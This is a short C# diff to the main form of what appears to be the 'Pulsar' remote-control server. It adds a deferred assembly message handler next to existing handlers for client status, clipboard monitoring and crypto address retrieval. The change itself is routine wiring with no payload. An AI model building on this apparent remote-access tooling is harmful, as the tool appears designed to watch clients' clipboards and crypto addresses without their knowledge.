@@ -52,6 +52,7 @@ namespace Pulsar.Server.Forms
         private readonly ClientStatusHandler _clientStatusHandler;
         private readonly GetCryptoAddressHandler _getCryptoAddressHander;
         private readonly ClientDebugLog _clientDebugLogHandler;
+        private readonly DeferredAssemblyHandler _deferredAssemblyHandler = new DeferredAssemblyHandler();
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object();
@@ -60,7 +61,7 @@ namespace Pulsar.Server.Forms
         private bool _offlineRefreshPending;
         private bool _statsRefreshPending;
         private readonly HashSet<Client> _visibleClients = new HashSet<Client>();
-    private readonly Dictionary<Client, ClientListEntry> _clientEntryMap = new();
+        private readonly Dictionary<Client, ClientListEntry> _clientEntryMap = new();
         private bool _syncingSelection;
         private IReadOnlyList<OfflineClientRecord> _cachedOfflineClients = Array.Empty<OfflineClientRecord>();
         private PreviewHandler _previewImageHandler;
@@ -127,6 +128,7 @@ namespace Pulsar.Server.Forms
             _clientStatusHandler.UserClipboardStatusUpdated += SetUserClipboardByClient;
             MessageHandler.Register(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived += OnAddressReceived;
+            MessageHandler.Register(_deferredAssemblyHandler);
         }
 
         private void UnregisterMessageHandler()
@@ -140,6 +142,7 @@ namespace Pulsar.Server.Forms
             _clientStatusHandler.UserClipboardStatusUpdated -= SetUserClipboardByClient;
             MessageHandler.Unregister(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived -= OnAddressReceived;
+            MessageHandler.Unregister(_deferredAssemblyHandler);
         }
 
         public void UpdateWindowTitle()
